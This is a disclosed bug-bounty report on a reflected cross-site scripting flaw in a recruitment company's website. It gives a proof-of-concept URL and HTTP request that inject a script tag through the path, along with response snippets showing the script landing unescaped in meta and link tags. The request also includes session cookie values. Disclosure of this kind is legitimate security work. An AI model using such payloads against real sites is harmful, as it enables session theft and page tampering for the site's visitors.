@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/228006
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/0xradi
+ReportedTo:Maximum(maximum)
+BountyAmount:50.0
+Severity:
+State:Closed
+DateOfDisclosure:24.05.2017 9:08:59
+
+Summary:
+
+##POC:
+By visiting the following URL > https://maximum.nl/"><script>prompt("exr")</script><!--/index.php
+
+Or preforming the showing request :
+```
+GET /"><script>prompt("exr")</script><!--/index.php HTTP/1.1
+Host: maximum.nl
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: laravel_session=eyJpdiI6Im94Uk52NHpxc3VKcFRoMThqRXZlRGc9PSIsInZhbHVlIjoiUWlqNk10dHNFclRcL1ZNNHJFWlZLWHhTQkNWbmlQd1pEMkFrRkJNSVpKYVlTajlLSlwvUllwWEhCYTNzckMzUVM2OVlkUStcL1BBbnVxMjVtcm51YUowdXc9PSIsIm1hYyI6ImRjMGYxNWFiNzE3MjZjYWMxOTdhY2EyMmVhYjhmYjE2ZTQyMTczYzk4Yjg2ODdlN2I0ZGY3NzgyMzFmM2YxODMifQ%3D%3D; _ga=GA1.2.1741493924.1494610209; _gid=GA1.2.1226624986.1494612538; _vwo_uuid_v2=58B280465974A9FE1B5DAF8815EA2396|02b9c0669e36dd7cd59d4a7a29ab29ef
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+```
+on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached  F184157.
+
+```HTML
+
+    
+                  <meta property="og:image" content="https://maximum.nl/"><script>prompt("exr")</script><!--/images/logo-maximum.png" />
+      
+    
+    <title>
+      Employer Branding - Directe werving - Retentie | Maximum
+    </title>
+
+          <link rel="shortcut icon" href="https://maximum.nl/"><script>prompt("exr")</script><!--/favicon.ico">
+    
+    <link media="all" type="text/css" rel="stylesheet" href="https://maximum.nl/&quot;&gt;&lt;script&gt;prompt(&quot;exr&quot;)&lt;/script&gt;&lt;!--/css/main.css?1490352453">
+```
+
+Best Regards,
+@exr
